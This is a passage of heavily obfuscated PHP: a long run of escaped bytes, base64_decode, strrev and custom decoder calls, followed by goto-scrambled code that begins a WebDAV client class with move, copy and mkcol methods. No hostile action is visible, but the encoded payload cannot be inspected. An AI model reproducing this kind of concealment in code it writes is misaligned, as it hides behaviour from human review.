)."\135\370\126\232\343\27\140\242\203\301\165\171\304\226\106\210\320\66\11\312\117\20\120\16\234\35\264\60\170\26\32\203\107\241\102\313\26\272\374\235\336\220\13\225\207\254\34\371\267\341\125\253\56\272\115\300\37\145"."\22\64\103\114\147\265\270\234\215\341\62\370\75\236\234\7\134\205\331\304\57\164\341\70\50\315\145\115\111\123\155\251\254\226\117\253\146\61\151\155\123\107\60\214\252\122\4\31\134\66\224\54\50\357\77\144\260\140"."\310\331\377\204\157\305\110\52\303\152\102\351\226\7\313\20\24\204\122\222\311\61\14\234\203\363\170\113\16\170\172\302\262\360\47\233\20\363\365\262\243\77\61\213\237\46\301\23\160\320\165\64\67\312\222\344\160\241"."\40\217\300\102\305\242\60\153\245\5\210\214\66\1\70\43\65\27\365\0\102\203\252\102\355\342\316\203\24\323\26\350\16\366\106\174\136\127\131\44\12\24\356\54\104\252\54\223\14\217\233\301\326\33\35\70\116\220"."\x6b\x2\x14\xa4\x3a\x6\xa\xe3\x47\xa4\x62\xa6\xd2\xd4\x76\xa8\x76\x2a\x6a\x1b\x8a\xe8\x25\x89\x2\xc0\x9f\x6f\x98\x99\xcb\xb5\xab\xd9\x32\xb\xd1\x77\xa0\x81\xa4\xa2\xe1\x5\x1d\xcc\xcd\x8b\xec\x7d\x58\x6\xc5\x1f\xe\xa0\x86\x82"."\125\212\77\347\53\176\261\54\102\137\106\65\225\126\71\133\362\51\224\245\64\225\366\16\327\16\54\327\167\74\225\102\132\125\331\230\140\224\112\120\174\113\204\205\230\4\345\204\103\116\232\206\103\56\72\344\234\356"."\220\207\165\107\134\313\17\72\222\106\12\374\31\16\260\364\302\344\124\26\40\146\145\107\26\60\60\107\116\115\252\216\34\10\250\246\143\64\347\60\32\162\144\21\316\25\100\142\241\301\241\245\164\207\76\10\212\64".base64_decode('MnBuDDpG5GHHSE525Bplh5ZOO4aHUo6RYcewlnCY9IyYikkxQ1RHHCqqiUEIdsF/wLjkCkasmFdHqQ==')."\113\364\234\246\15\113\271\341\114\362\77\341\143\165\147\73\76\26\112\0\337\323\65\143\120\166\41\35\52\105\267\57\107\54\275\237\40\214\103\275\101\60\332\162\241\340\0\2\115\22\154\73\221\121\360\200\75\47".base64_decode('r08/WwWpolYMSmpiDlwZ+gksJwh6KzARr1wx3XJMzvytwPMSUUQlIhcojjoXwiujYJmAUSZaGe2ftw==')."\x80\xfa\x81\xbc\x3d\x5c\x37\xe\xff\xad\x1f\x97\x1\x6f\x1d\xd6\xf4\xb8\x6a\xd0\x77\xad\x58\xd3\x7\x44\x61\xf3\xbf\xcf\x24\x32\xc3\xff\x21\x17\x97\x4f\xd3\x4a\x5e\xff\x9f\xbf\x2a\x64\x1a\x53\xa8\x65\xd0\x7f\x9f\x9d\xe7\x1\x1d\x45"."\xbd\xfb\xfc\xf\x1d\x5\x33\xc5\xc4\x27\xe6\x8\x92\xe1\x2a\xa8\x9\xc8\xa9\x5d\xb5\x2e\x7e\xaf\x82\xc4\x1a\x3a\xf7\x1a\xc1\x2c\x1d\x76\xa4\x1a\xe1\x54\x1b\x6\xd3\x6c\xd8\x91\xd3\x86\xc1\x8c\x56\x1d\x7a\x6e\x38\xee\xc8\xd\xe\x83"."\x0\x94\x99\x73\x60\x1e\x82\xb0\x2\x44\x42\x63\x24\x45\xe6\x6e\x43\xba\xde\xd1\x90\x2e\x38\x64\x30\xf1\xe3\x2a\xe0\x0\xea\x70\xca\x91\x37\x86\x1d\x60\xf6\x83\xff\x8f\x98\xa0\x38\xf0\x9b\x3\xb2\x48\xe\x4a\xe8\x39\x20\xaa\xf\x6b"."\x71\xca\x76\xa0\xd6\xaf\x4b\xcb\xc3\xa7\x1d\xe0\xc3\x7\xae\x11\xf8\x70\xae\x63\x22\xe1\xba\x14\x3f\x83\x5e\xd6\x2d\xcd\x40\xd\x20\xfe\x6b\x36\xe0\xb0\x4e\xd8\x4\x39\x54\x8b\x9\xc6\x13\xff\x35\x8b\xb0\x95\x85\x93\x85\x92\x70\x6d"."\321\36\106\230\221\13\135\244\25\130\112\204\11\16\46\177\162\64\222\31\136\311\44\142\131\115\33\54\26\4\126\200\123\361\56\333\160\365\327\326\215\327\15\270\370\364\376\117\230\270\330\377\204\205\30\203\200\304"."\x7b\x6\xa3\xa3\xf4\xd8\x77\x57\x91\x7c\x49\xc8\x30\xce\xf7\x90\x9c\x6f\x72\x7e\x39\x2e\xf2\xcb\x71\xc2\xec\x6\x2c\xc2\xaf\x9d\x38\x18\xd7\x85\x9\xb0\x13\xe8\x59\x28\xf9\x2d\xe1\xba\xfd\x3a\xd8\x33\x8a\xf3\xaa\xcc\xee\x81\x88\x5c"."\224\31\23\153\137\303\122\21\66\371\276\3\313\306\346\55\314\335\302\242\163\154\361\266\354\204\113\300\150\120\160\270\204\237\353\211\214\112\57\236\320\15\210\150\110\103\267\6\112\122\220\367\101\206\154\122\127\362"."\xc2\x9b\x44\xa0\x45\x60\x87\x6\x9d\xc4\x30\x10\xe8\x44\xfe\xf0\x8\xfc\x6a\xb3\xdb\x8d\x15\xc2\xe1\x76\x7c\x2e\x34\xda\x6a\x6a\x24\x9c\x42\x16\x34\xb9\x34\x26\xc0\xa0\xb9\x84\x83\x1d\x5d\x81\x56\xf\x72\xe\x11\xeb\xc\xd0\x97\xbf".base64_decode('W1rmG+INWQaQkxPUI82exuyTdagH4YgQZUGJpEpant1xkWOzEYyKI8HOYMzTG+kUHGwwUJCo+aAnzg==')."\x21\x24\x10\xf2\x2f\xf7\x70\x47\x59\xa0\x61\xf4\x38\xa9\xaf\xaf\xcf\x9\x8f\xe3\xa1\xa1\x4b\x2\xbd\x8e\xde\xa\x13\x25\xc8\x27\x73\x2d\x15\x83\x5a\x32\x91\xd5\x8a\xc9\xa\x5e\xa0\xbb\xce\x55\x2b\x35\xd6\xd6\x49\xbd\x79\xaa\x54\x4a"."\167\117\101\135\116\347\144\370\102\244\123\170\100\262\15\6\235\155\130\65\305\236\150\171\44\231\176\34\47\201\255\6\240\72\141\103\35\30\126\164\301\162\201\276\373\115\176\273\3\113\210\206\163\133\40\110\216\27"."\272\27\61\5\27\257\122\240\62\165\133\311\203\322\110\47\147\64\227\235\313\64\176\204\103\323\171\336\346\202\256\25\122\152\76\51\1\234\274\321\354\155\251\360\172\226\64\127\314\7\111\162\66\13\123\45\367\374"."\171\156\216\110\106\54\30\12\4\333\375\314\265\106\20\16\1\71\75\303\332\325\116\37\231\70\344\123\26\5\367\12\320\323\25\134\301\275\2\325\251\102\242\276\376\220\171\14\16\326\325\23\137\224\242\375\56\321"."\x2e\x85\x76\x71\x42\x3f\xc0\x28\xb3\x94\x41\x4\xe2\xf5\x41\xf\xa\x2\x79\x64\xd8\x21\xb9\xcd\x3c\x3\x3\x89\x49\x61\xa7\x68\x52\x8\x3a\x2\x2e\x5f\xf0\xa2\x1d\xf6\x2a\xec\x98\x4\xd4\x43\x42\x93\x6\x77\x8d\x25\x9d\xe5\x4a\x2b"."\x26\xb9\x8e\x45\x70\x58\xbb\xa4\x1b\x2e\x4b\xce\xa4\xaa\x2b\xc8\xe9\xd\xcc\x6c\x43\x2b\xfb\x51\xaa\x4e\x85\xbc\x2f\x8\xbe\x18\x8b\xc2\x24\x57\x44\x43\x78\xc6\x82\xe2\xcc\xc2\x2\x14\x89\xee\xeb\x6c\x3\x4d\xa2\xe1\x96\xa\x62\x72"."\x48\xe7\x5\xe4\x95\x15\xf3\x31\x5b\x9c\x17\x6e\x56\x46\xe1\xa0\x82\x26\xcf\xf\xa0\xc7\xbb\x7b\x34\x13\xe9\x53\xcd\x73\x8b\x69\x0\x91\xa8\xf3\xce\x67\xc3\x5\x31\x28\x10\x15\x7\x5b\x8d\xaa\x32\xdf\x4a\xb4\x70\x3b\xdf\x2c\xb1\x97".base64_decode('1znFFs0UIdglsj7WLJV5wT1bVn/eRCUSJtYdKTtpofkTqFrL7KbG2lpHrmiYTl2xvqQLO0qqJ/Mu7A==')."\304\23\333\271\104\5\374\300\113\55\275\221\247\205\146\211\114\4\207\104\347\7\16\5\75\221\266\116\207\204\210\325\41\165\370\42\0\334\13\376\301\326\13\16\11\316\153\220\14\346\271\103\202\166\326\16\251\267"."\x7\xff\x72\x7d\x74\xd0\x77\x98\x2c\x90\xc5\xf\xea\x4a\x10\x87\x14\x4d\x89\xc6\x4d\xa2\x24\x9\xce\x58\xa8\x65\x43\x7a\x1d\x3\xe8\x88\xe6\x9a\xfb\xd4\x7c\x43\x3d\x54\x47\xc7\x96\x4c\x70\x1b\x4f\x88\x1\x70\xc7\xa2\x9e\x6f\xc6\x9e".strrev('“¨Udù¤íaWXàÊ©ÿŒTÑx™		@¥ÿÿâuAk'."\0".'—ÿüç½ZÏ¹PÍ@N¸,E€MNgŸ')."\xea\x6b\x6b\xa5\xc0\x22\x88\x46\x52\x26\xb\xb9\x68\x27\x13\x5e\x80\xc7\x7\x8f\x9\xd1\xcb\x48\xca\xc3\xf4\xad\xde\xc\x9c\x64\x6a\xbe\x40\x3d\x6f\x22\x46\x5\x6\x3e\xd4\x17\x62\x6e\xef\x34\xeb\x72\x10\xb1\x70\x6b\xd2\xb0\x24\xe5"."\xd4\x64\xb4\xa1\x3a\x7f\x12\xee\x41\x40\xde\x31\xd6\xe\xb8\xb6\xf\x2b\x30\x8d\x76\x16\xc6\xc4\xac\x2c\xd9\x8c\xbe\x82\xb9\x18\x3\x5b\x10\x41\x81\x18\x13\x4c\xf2\x6c\xd1\x0\x85\x71\x6c\x9c\xc6\xd0\x93\x70\x1d\x9a\xaf\xe6\xe1\xd3"."\xbe\x26\xe2\x6d\x18\xc2\x10\xb4\x91\xbc\x42\x27\x3d\xcc\xf\x4d\xfd\xdc\x8\xe8\xe6\x8c\x19\xe6\xc3\x88\x2c\x1f\xf1\x54\x3a\xdf\x8f\x8b\x56\x20\xa\x85\x59\x5b\x5\xad\xc0\xe6\xd3\x59\xa1\x15\xe4\xa1\xa2\xc2\xe0\xcd\xb6\x59\xc2\xda"."\214\62\61\62\260\365\30\305\262\164\55\43\27\134\44\174\103\317\31\101\337\340\14\50\217\127\210\146\11\72\254\166\2\176\62\134\302\222\113\150\1\16\350\204\74\161\302\105\374\73\127\126\254\336\113\27\126\104".base64_decode('bDi41OkbLYA6KkmwUoP9/JjFTti9Ahuf4Fu9mmonDTDHUK2EH+KfYbRMESYNhVUSHgbzAbqoTdbZAQ==').strrev('­Ø'."\n".'Yñd ¬hÈ(,1ê±w£…“J†Fkã1ïrŠ²4¯9Y'."\n".'Æ’^ğY¤İ´,‰ià¥K[õ')."\0\122\45\360\261\11\340\211\254\16\75\320\45\305\270\232\203\67\220\62\253\244\16\44\172\300\215\6\51\116\132\127\224\274\5\22\317\26\25\13\100\316\26\62\62\202\140\0\171\230\243\55\356\156\113\273\333\164"."\x77\x1b\xd9\x89\x7f\xf\xff\xec\x49\x92\xc9\xaa\x45\x7c\x6b\xd1\xe7\x3c\x50\x3\xf1\x46\x1b\x3a\xe3\x49\xab\xa9\xb2\x70\xb8\x55\x28\x9b\x50\xa0\x52\x1d\xea\x6d\x1c\xc4\x7d\x3d\x4e\x65\x91\x54\xc\x1a\xa\xc5\xf8\xd1\x46\xc9\x25\x12".strrev('œñi­¯íÔ[€•·ñÆ'."\0".'%²éâ\' @}¡ŒË½¬Gw/µRÊ“ˆW±üaEÑÀo>™l™¤3*')."\x55\x2d\x4d\xcd\x23\x59\x20\xc8\xbd\x6\x81\xa8\x6c\x30\xb7\xb7\xc4\x9b\x24\xc9\x3\x2d\xa\x70\x70\xee\xbc\xb8\xee\xa6\xb6\x97\x71\x61\x57\x64\xe4\xe4\x2c\xd7\x7a\xa2\x5a\xee\x6e\xa3\x88\x43\xd4\xff\x4c\x97\x9f\x4c\x30\x37\xd9\x23".base64_decode('dqlxav3U1rUcNAG6CQmEPKFl3O8xSIl4QhOkwDzE2yB1gDd34cKF9PnWRBbbc0LLAnbnDqDwBEsphQ==').base64_decode('yqWYUE0PGUFZ7uxDsu7BLSiTuFwtTJCoFujjmwWqyl6g70yY7EhOcP8zi/yOkt/4akL7sk70DxIyyQ==')."\257\32\344\214\55\275\32\352\307\321\60\130\216\262\374\54\24\51\36\17\110\155\162\276\322\224\2\0\155\256\324\15\55\237\362\151\151\65\150\71\166\254\155\160\327\42\106\106\311\146\143\120\57\216\124\67\221\321"."\44\373\56\223\106\47\376\6\57\206\200\213\124\347\3\162\130\120\101\62\363\310\164\27\64\6\270\57\14\142\201\350\162\21\105\40\350\147\0\160\34\53\22\162\136\112\175\43\240\243\207\30\140\206\202\47\114\344"."\x6e\xb\xae\x3f\xc8\x78\xc2\xe2\x2c\x67\x91\x96\x24\xc3\xd6\x8c\x3d\xe4\x24\x95\xd1\xb9\x12\x72\xf4\x44\x1c\xa8\x97\xf7\xb8\x84\x3e\x23\x81\xcf\x40\xdb\x32\x9\x5b\x5\x5b\xb4\x8\x31\x42\x9\xa4\xd9\xa2\x8c\x88\x13\x4a\x2b\x3c\xbd"."\266\256\126\60\4\361\267\371\302\261\343\302\320\135\152\227\237\72\337\261\46\370\101\132\44\64\101\212\47\64\121\112\240\365\270\11\122\332\350\46\303\232\322\25\10\204\105\77\117\266\352\365\6\5\117\222\144\23"."\xd\x17\xf8\x3a\xa2\x19\xda\xd3\xdb\x45\xf8\x57\x94\x50\x70\x94\x30\xec\x36\xa2\x22\x15\x2d\x4e\xaf\x6d\xa4\x36\x42\xfc\xcd\x53\xd8\x37\x31\xe1\xed\x70\x7c\xec\x86\xc3\x1a\xda\xc6\xe1\xb0\x94\x90\xb1\x2d\x4d\x5c\xc1\xa2\x83\x92\x84".strrev('‹S5]hªš®Õ•ãUîàÃ 8Ó¤½iî5£´XDå¦cêŒ×*îİŸÎƒOİ”Ô$íaaş')."\122\143\264\150\264\110\24\250\6\326\64\256\345\16\53\243\375\256\232\350\300\61\202\106\332\32\0\130\313\0\43\31\172\246\206\334\133\60\54\243\246\252\277\242\162\300\125\323\277\42\32\35\200\301\152\0\153\206"."\360\150\330\125\123\355\130\160\214\273\127\65\104\174\354\120\173\102\34\322\345\324\34\255\300\56\10\240\134\243\202\255\24\62\267\20\225\156\203\76\300\224\5\367\36\146\256\40\220\55\76\213\23\265\327\61\204\60".strrev('¨‚À½¼¨@®¡]‰áqoM¿¢b‚„3éÚ…-°LYÏ V¥j[2ÔYn5[ñkWÍ©+O¨-')."\53\45\14\203\316\26\312\273\202\43\136\73\100\3\204\72\141\147\222\360\124\200\26\11\26\332\116\233\117\56\262\327\52\355\103\34\6\204\114\246\26\302\3\237\102\233\37\352\314\204\53\216\217\304\111\17\300\76".strrev('Ğ×@$•÷/ö? '."\n".'´ŒA9yô Ş¡fß\'ƒ®ŸOà!*9R&¸a•kÕÂ³»ìÈ>Ù')."\345\123\300\172\37\361\123\361\107\200\367\4\220\363\71\13\274\267\147\121\117\240\257\34\152\244\73\310\145\11\41\251\315\323\23\211\11\33\127\274\243\1\373\62\266\245\241\132\355\11\75\321\120\37\147\323\214\71"."\145\243\2\77\231\51\370\107\364\313\60\352\144\112\376\164\123\344\345\216\120\110\66\164\72\113\252\200\234\301\220\14\342\121\217\230\354\220\312\36\364\260\135\27\261\366\260\235\141\306\325\274\114\135\340\346\350\267"."\163\314\144\16\172\201\242\136\164\220\171\33\225\14\304\373\357\2\273\104\44\66\145\72\110\325\221\105\270\160\260\227\67\103\112\132\214\166\151\114\357\17\255\346\145\212\200\217\45\11\326\50\160\47\343\111\230\105".strrev('abŞ£4IYŸ¨øØİœÎ1pô"Á<]¹´±—›k!Èã%ÃZÄg>[\\¾àë{¹á&!ñ')."\1\350\35\41\330\2\103\114\3\305\302\47\265\171\313\304\54\350\233\45\131\160\32\264\160\343\254\114\114\61\240\122\127\57\25\273\312\245\224\371\24\112\22\172\64\101\67\173\324\271\35\351\44\336\127\46\355\357"."\172\47\175\133\114\164\67\113\354\343\110\347\72\353\45\201\274\40\357\21\50\2\37\131\260\156\344\26\237\131\216\243\101\167\21\124\227\23\276\3\304\137\170\101\217\34\261\241\105\257\41\261\230\56\130\233\51\111"."\x3a\x74\xe8\x35\xa1\xb2\x6b\x9\x6\xa2\xe7\x86\x7a\xcb\xa5\xe3\xce\x82\xc9\x5e\x8b\x47\x4f\x1b\x2\x98\xf2\xd6\x74\xf4\x45\xb1\x32\x29\xfc\xb4\x94\xc5\xdf\xa1\xad\x10\x1d\xa7\x79\x15\xee\xc9\x4\xe5\xe2\xed\xe0\xce\x51\x1\x8\xec".base64_decode('fZAnO94x3Ekdfj6JunD1JJN2cERjwFJHdy7mwpZ44Qeb0rA/0FNVDaUsi9uB7jHmTR2MJFrHu+VRPg==')."\120\54\102\123\31\235\32\226\10\366\61\151\311\315\100\14\153\104\41\14\231\355\272\202\235\101\67\3\265\322\156\142\317\342\20\373\152\370\50\201\130\150\200\310\254\43\330\114\12\107\332\232\231\333\115\272\45\32".base64_decode('yakJqSvQAffjXn94kZRWTIkLQuh2wzrzkfcIPDiU8uNUNwYFnfCgxJlk9rAG26OI3jhhMWWLpaJASQ==')."\x89\x79\x78\x49\x9b\x2d\xc9\x3\xf7\x2d\x65\xb0\xb3\xfc\xe8\x43\x40\x26\xfb\x1c\x2b\xfe\x98\x2\x2f\xa\x84\x1a\xb\x19\x8a\x65\x6a\x43\xf0\xcb\x7f\x1\x9d\x93\x8a\xd8\xe8\x20\x69\xa2\xca\xab\xf9\x61\xd5\x50\x39\x73\xa0\x39\xc6\xc4".strrev('Œ1ø$-X'."\0".'E'."\r".'V]İ÷'."\n".'‰R’ä5ßP,&áâß˜&È<‡ãÍb]•˜ºÎ|n1ç¡«¡×¹Ò')."\205\141\41\177\107\147\344\277\56\116\115\362\47\10\155\225\121\223\124\136\144\256\302\201\224\210\312\303\272\77\226\52\100\365\6\316\51\374\136\7\172\53\216\373\222\105\101\40\121\72\340\1\27\252\200\103\170\52".base64_decode('C90lk0mkasjOlZh3Ypg/EMOvYuGo2y4kp5DNKLJREjwjuenJJHMdDg+ofdRfCoxws1TuDJZ6xIUFkA==')._kodDe('LLQBUwxXRTVHkUGFQ9xIgyD8KN85ZiCUJU8mCESnhiAZ1vmqhTEHgjWWTNZMdBA0rdiH+cPq/sIZZW0=').base64_decode('vlzBtFhdd6oGf4gECRt8UwUlOC03VgKwmPV30Wowj6zQoCWf0sRWIyYH1goHCvgAD8IhbNbtgKfjZg==').strrev('Şe/ÉE[X(WÖ™0ô}úÛ‚±†EÊEŒ,UD)¥UÂ§h|LépL¾ÃP°™ËX¬2—TQ').base64_decode('9qLBSLYRbRZK8jBaktitcPU5UleHbdmAvu3kPONQcDwBEnaPBAJ8VtE0gXyYJyq2Y0WuYdnJNVi9Iw==')."\200\303\245\35\130\376\200\274\201\307\132\307\304\260\350\233\27\325\53\302\214\164\324\44\33\41\361\66\337\111\123\241\156\32\345\20\234\174\161\252\100\316\214\355\210\271\261\151\100\10\73\264\164\141\57\43\70\105"."\7\333\10\346\251\326\202\106\230\6\330\152\361\103\127\233\207\34\14\44\336\162\212\171\77\176\264\301\2\325\205\155\212\350\35\31\373\10\342\236\354\11\72\370\132\20\73\5\42\315\26\213\244\216\231\320\17\334"."\310\200\31\313\154\306\335\245\216\234\240\303\115\62\33\105\247\264\304\277\226\113\334\107\20\4\151\236\304\7\330\62\201\240\230\6\147\45\12\240\131\51\12\233\345\241\226\131\211\120\30\311\241\227\101\31\365\301"."\36\45\77\136\45\305\304\160\30\347\373\65\361\311\32\114\106\36\46\265\320\302\321\57\344\214\16\334\70\7\243\164\325\350\102\72\236\106\30\113\243\16\170\77\12\176\360\216\302\160\360\107\11\34\370\256\3\31"."\x16\xd9\xe9\x2c\xcb\xbd\x69\x81\xae\xe6\x8d\x83\x35\x8d\x88\xd\xb5\x48\xc1\x76\x1\x98\xf5\x96\x2d\x43\xc8\xde\xa3\x11\xad\xd4\x99\x5\xf7\x60\x95\x2f\xe6\xb8\xd3\x30\x10\xb1\x6e\x8\x4a\x1a\x2c\xb4\xb0\xa8\x67\x1d\x48\x43\xd9\x41".base64_decode('X2e0dYdQh5gptJEJn7aRKtO7/7F04uIXyf9AfsIOQXBSM7obKo+mWkgSbMD5qTt+drZgXxyW5ZL1DQ==').strrev('î2V@C„™Ç>NSÁ3Wşùº˜\'^LÂuh”jN+u¾‰4¡n4‚Ñ‘tôTÚ!ş=PÏÜr>n[ˆç3')."\x16\x10\xfa\x2\x11\xaa\xe0\x5b\x50\x58\x93\x6c\xce\xe3\x34\x68\xb3\x6f\xf0\xf\xe3\x75\x85\x4f\x67\xeb\xb7\xd0\x27\xca\xb5\xe8\xff\xdf\x66\x4\xe6\x33\xc\xb5\x1b\x7a\x3\x74\xa1\xa0\xa\x5f\xea\xb3\xee\x7a\xca\x9\xf7\xa8\x4c\xba"."\223\200\216\172\171\314\352\201\217\34\13\360\144\101\372\27\113\64\65\373\361\6\314\16\227\74\364\152\102\40\237\45\153\54\274\53\345\163\225\367\43\176\147\366\277\357\26\52\364\343\175\3\167\103\130\246\27\334".strrev('T=qT‚tóù$"i\\ò +eŸaQÁ Å1ã…´N›)ßâÌZ‹´wÛ‡Õ²$w­o)')."\xfa\x28\xbf\xd\xa5\xc\x8e\xab\xfc\xa1\x77\x2c\xb8\xb\x19\x34\x97\x2d\xf3\x5a\x78\x6b\x5a\x7c\x16\x2\x15\x24\x4e\x93\xd2\xa2\xd1\xc9\x6\xa9\x2f\x99\xd8\x48\x77\x4\xf9\x63\xf4\x74\xb0\x97\x3e\x20\x19\xf0\x2a\x58\x89\xc2\xd4\x78"."\x8a\xa9\x59\x1f\x27\xa\xd0\xf3\x61\x20\x5c\x59\xb6\x4e\x20\xce\x6d\xf4\x4\xf6\x94\xb4\x1\x69\xf\x20\x4e\xc0\xd9\x1d\x60\x43\xaa\xb0\xfd\x21\x32\x3d\x97\x8d\x51\x43\x5\xf7\x58\xe4\xf0\x85\xf7\x94\x87\xcc\xa5\xa4\x43\x7c\x61\x1b"."\x44\x19\x31\x93\xa5\x97\x30\x48\xe4\x5d\x1b\x7f\x56\x58\x59\x69\xed\xd2\x42\xa8\x87\x9a\xb1\xc0\x88\x70\xf4\x88\xb6\x1a\x2c\x31\x23\xee\x42\xe0\xe3\x6a\x38\x44\x45\x69\x56\xb\xb4\x18\x94\x9b\x57\xb8\x12\x90\x28\xc9\xf2\x8e\x82\x74"."\1\202\172\356\310\274\34\346\141\233\322\122\166\212\333\365\35\242\2\54\225\271\166\357\40\242\256\255\216\326\125\157\37\61\225\320\226\303\22\43\21\56\332\43\273\1\341\376\22\305\231\113\140\372\126\36\175\102"."\x4f\x66\x1e\x8b\xa0\xab\x27\xb6\x83\xc7\xe7\x9b\x4\x25\x9b\xe5\x2b\xac\xf8\xfa\x50\x36\x2e\xeb\x2e\x40\x63\x83\x26\x75\x8d\x57\x2e\x22\x8a\xf7\x65\x36\x8d\x54\xf2\xe4\xd\xc8\xab\x89\xc1\x32\xae\xb0\x60\xc7\x43\xa5\x31\x61\x71\x13".strrev('	ãà„=Ø |¬± ,'."\r".'È©!é8²°9îT7é€Lø™YI ™íi=”Àä€aÎ4‚D')."\224\36\54\71\240\353\254\126\141\243\202\221\350\23\250\304\323\231\300\264\112\75\243\225\346\146\263\122\314\2\337\22\267\236\233\210\105\141\35\4\270\257\17\301\235\267\313\126\34\233\66\145\347\210\152\340\263\145".base64_decode('cXsJQmLF6FwL6hqSk6xQdlAg2NMJymxhO7eynXeDHY1wF4SfjVU1pLLhCUuAZ0nh3u4q5C4fAmAAPw==')."\120\270\222\210\155\53\245\311\222\360\37\176\246\262\12\46\303\102\126\112\376\36\376\4\170\265\304\237\127\304\351\204\132\201\240\337\256\261\161\207\167\333\202\32\24\171\342\302\342\53\236\300\306\205\245\222\276\204".base64_decode('IVyaWxOgM3DrbJlfDi2h6YaAxuDlcMHwh03LQEF5lwrZYBsh8WFFG2O817VseYmSmAgSrryguYTVnQ==').strrev(',ˆØny²×«ÊLËö_>2PFîçáø>à‡è¹FHKµEVá,¡ti™Ş±©¸A)-,ú`DJ1').base64_decode('+aYOZYyDWqJ/PAXVnsPMqHqyVc0n7fjFfJxBOToYDI5c5rZIkBdYFiCVcWZugwvrDmen8jC/ieHicQ==').base64_decode('MtkuD5dBZY4DGBRAGCoSkIR3iriPbGVE/DrBK/MOEkQs8zoSe8fI3i400RicXIjlBQ+ChBQ5COEkmA==')."\163\111\141\217\1\165\63\271\327\111\134\107\266\21\347\237\264\76\267\304\320\330\140\0\34\144\143\341\264\100\155\73\55\170\72\113\327\137\133\22\71\5\20\212\57\173\130\140\41\223\56\241\70\361\376\155\302\14"."\341\362\37\341\264\154\355\142\341\151\52\236\100\227\71\261\24\13\367\145\15\43\230\41\61\321\122\35\373\320\242\115\0\247\113\14\314\241\23\117\27\75\54\56\305\127\154\265\27\63\330\133\206\163\350\45\375\103".base64_decode('8pT/tP0DtHvsWyteiLDFKbmaj2hl8uAalc2Gk2BOLsdZ8hojqpnIlM2Lk2DekmSaWTjTEPKZctGYoA==').base64_decode('eaWdR7bqJYwMgGybWIw6UX+WRS79HCEeOzba25evRdkzlYlqURZ5wlpwbBunLscPacp3vQRXhtfytA==')."\x32\xd7\xf5\xb8\x4c\xb8\x48\x87\x2c\x1a\xad\x25\xc9\xe2\xdd\x7f\x79\xed\x80\x50\xd9\x59\x6c\x58\xaf\xed\x6d\x70\xb1\x63\xb8\xcf\x52\xe2\xc5\x74\x30\x4f\xbd\x82\x81\xec\xdc\x9d\x26\x54\x84\xf7\xe8\xf6\xce\x19\x27\xd2\x9f\xcd\x41\x35".base64_decode('pb18UXCKXNbDtQPui0s3nlnqM070/433JpqpJgQ1IQgUXVjjdPqRLD9aI1ICPqfxilrv79x6yq47rw==')."\331\165\303\306\135\147\255\333\161\366\205\216\235\147\134\275\363\222\323\167\136\162\346\216\365\33\167\134\164\55\116\330\171\351\311\357\136\164\326\134\151\347\351\47\300\304\363\117\175\373\256\133\361\277\73\256\272\343"."\235\33\356\331\265\355\6\214\262\143\313\35\357\154\271\172\327\271\327\356\74\355\266\235\27\134\261\363\274\323\350\163\255\226\43\237\322\343\41\27\77\275\266\70\135\307\13\74\71\271\307\27\154\110\57\214\135\332"."\300\15\232\3\257\233\70\71\254\351\46\364\265\0\370\175\1\375\266\152\246\111\331\20\20\253\21\46\22\21\221\53\47\101\347\0\204\370\15\15\34\41\164\151\200\150\31\361\34\24\44\127\175\160\63\33\126\160"."\x2a\xe2\x54\x96\x8\xbc\x8c\x60\x91\x50\xe9\xad\x43\x7b\xd1\x76\xc9\xc8\x1\x60\x1b\x1a\xd7\x46\x9\x29\xa1\xd7\x9c\x78\x7d\xe0\xe5\x1\xe9\x16\xbb\x18\xc8\x6f\xfe\x9\x2d\x8b\x1a\x14\x48\x91\xd1\x70\xe3\x14\x37\x31\x7a\x70\xa2\x32"."\x9c\xe4\x99\x51\xa6\xf4\x48\xb2\x27\xd1\xdc\x63\xde\x5e\xbf\xab\x4\x72\x3a\xc9\x8b\x40\x9a\xd0\xf8\xb0\xa9\x27\x10\x89\xf9\x96\xfa\xc3\x91\x70\x49\x52\xd0\x13\xe\xf7\x5\x42\x5e\xac\x38\x5d\x92\x8c\x72\x9\xca\x2a\x25\x49\xc1\xce".base64_decode('QM9Eab5uj7+rJA0qr0B1bvoSLk7yB1EtPV1dVHuytBb+tkW8JuhOlR+Z29S5ChmNHhLTG4awTCeb+A==').strrev('ûY4p.Ü²ìk~5íDƒQ†“Ì[ãÚsõ°¤=\'Š€xA»%'."\n".'™‡}Ì8ƒ™ëB]‡c’Œ`').base64_decode('EohQXJoRoKZsj4m3wKW3ACiVdwGs6XHUs8kqLS6c8mOeZuFmorYRDpPk/wNhkKlG78cAAA==')."".""."", 10, -8))); goto AÃ•ÖˆÑâ—; bÙ­ç¯ë×³: define($_SERVER[…Ò×–][1948], 3); define($_SERVER[…Ò×–][1949], 4); define($_SERVER[…Ò×–][1950], 5); goto aİ«õİšÛÚ; EÏôª‚ç¯Ö: class HttpDavClient { public function __construct($aÔ·› Æâš, $FƒÎˆ³¥×, $e¶½£ÙÊˆî) { $this->header = array(); $this->userName = $FƒÎˆ³¥×; $this->userPassowrd = $e¶½£ÙÊˆî; } protected function makePath($B§èÀ†Ñ„æ) { return $B§èÀ†Ñ„æ; } protected function setHeader($c´»‘¹óÃ, $b——êÈùÙ = false) { if ($b——êÈùÙ === !1) { $this->header[] = $c´»‘¹óÃ; } else { $this->header[] = $c´»‘¹óÃ . $_SERVER[…Ò×–][886] . $b——êÈùÙ; } } public function move($EÃËàÏÄºí, $eçè¨æĞ¾, $BƒçËˆàôô = '') { $Fê‘ÅƒÍ†‹ =& $_SERVER[…Ò×–]; $this->setHeader($Fê‘ÅƒÍ†‹[1781], $this->makePath($eçè¨æĞ¾)); $this->setHeader($Fê‘ÅƒÍ†‹[1782], $Fê‘ÅƒÍ†‹[1783]); if ($BƒçËˆàôô) { $this->setHeader($Fê‘ÅƒÍ†‹[1784], $Fê‘ÅƒÍ†‹[931] . $BƒçËˆàôô . $Fê‘ÅƒÍ†‹[934]); } return $this->send($Fê‘ÅƒÍ†‹[1785], $EÃËàÏÄºí); } public function copy($d±†Òªİ‚ä, $dĞà¥ªŒº) { $d¼¼“è«ñ =& $_SERVER[…Ò×–]; $this->setHeader($d¼¼“è«ñ[1781], $this->makePath($dĞà¥ªŒº)); $this->setHeader($d¼¼“è«ñ[1782], $d¼¼“è«ñ[1783]); return $this->send($d¼¼“è«ñ[1786], $d±†Òªİ‚ä); } public function mkcol($Có¸½”Î¿“) { $D¬ÏèÓ¢°¹ =& $_SERVER[…Ò×–]; $this->setHeader($D¬ÏèÓ¢°¹[1782], $D¬ÏèÓ¢°¹[1783]); return 